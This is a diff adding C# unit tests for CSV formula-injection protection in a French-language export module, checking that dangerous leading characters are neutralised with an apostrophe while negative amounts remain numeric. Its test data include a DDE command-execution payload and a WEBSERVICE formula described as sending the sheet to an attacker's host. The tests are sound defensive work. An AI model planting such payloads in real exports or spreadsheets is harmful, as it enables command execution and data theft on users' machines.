@@ -150,4 +150,55 @@ public class CsvTableTests
         Assert.Equal("Oui", CsvCell.YesNo(true));
         Assert.Equal("Non", CsvCell.YesNo(false));
     }
+
+    // ── Formula injection ──────────────────────────────────────────────────────────────────────────────────
+    //
+    // Every « Exporter » in the product funnels through CsvTable, and the file's destination is a spreadsheet on
+    // the cabinet's — or its accountant's — machine. A patient name is free text and is written into a cell
+    // verbatim, so a name beginning with `=` is code unless something stops it. RFC 4180 quoting does NOT stop
+    // it: Excel strips the quotes on import and evaluates what is inside, which is why the check below asserts
+    // the apostrophe and not the quoting.
+
+    [Theory]
+    [InlineData("=cmd|'/c calc'!A1")]          // the classic command-execution payload
+    [InlineData("=WEBSERVICE(\"http://x/\")")] // exfiltrates the sheet to an attacker's host
+    [InlineData("+1+1")]
+    [InlineData("@SUM(A1:A9)")]
+    [InlineData("\tSomething")]                // a leading TAB shifts the parser onto the next character
+    public void A_Cell_A_Spreadsheet_Would_Execute_Is_Marked_As_Text(string payload)
+    {
+        var line = Render(CsvTable.Create("Nom").Row(payload)).Split("\r\n")[1];
+
+        Assert.StartsWith("'", line.TrimStart('"'), StringComparison.Ordinal);
+    }
+
+    // ⚠️ The regression this pairs with. A negative dinar is written `-1234,500` by CsvCell.Money, and the whole
+    // reason the accountant asked for the file is that the column sums — so neutralising every leading `-` would
+    // trade a security hole for a broken total. The rule is « a leading `-` that is not a number », and these two
+    // cases are the two sides of it.
+    [Fact]
+    public void A_Negative_Amount_Stays_Summable()
+    {
+        var line = Render(CsvTable.Create("Montant").Row(CsvCell.Money(-1234.5m))).Split("\r\n")[1];
+
+        Assert.Equal("-1234,500", line);
+    }
+
+    [Fact]
+    public void A_Leading_Minus_That_Is_Not_A_Number_Is_Still_Marked()
+    {
+        var line = Render(CsvTable.Create("Nom").Row("-2+3+cmd|'/c calc'!A1")).Split("\r\n")[1];
+
+        Assert.StartsWith("'", line.TrimStart('"'), StringComparison.Ordinal);
+    }
+
+    // An ordinary French name must come through untouched — a guard that marks everything trains the reader to
+    // ignore the apostrophe, and then it means nothing.
+    [Fact]
+    public void An_Ordinary_Name_Is_Left_Alone()
+    {
+        var line = Render(CsvTable.Create("Nom").Row("Béchir Ben Salah")).Split("\r\n")[1];
+
+        Assert.Equal("Béchir Ben Salah", line);
+    }
 }
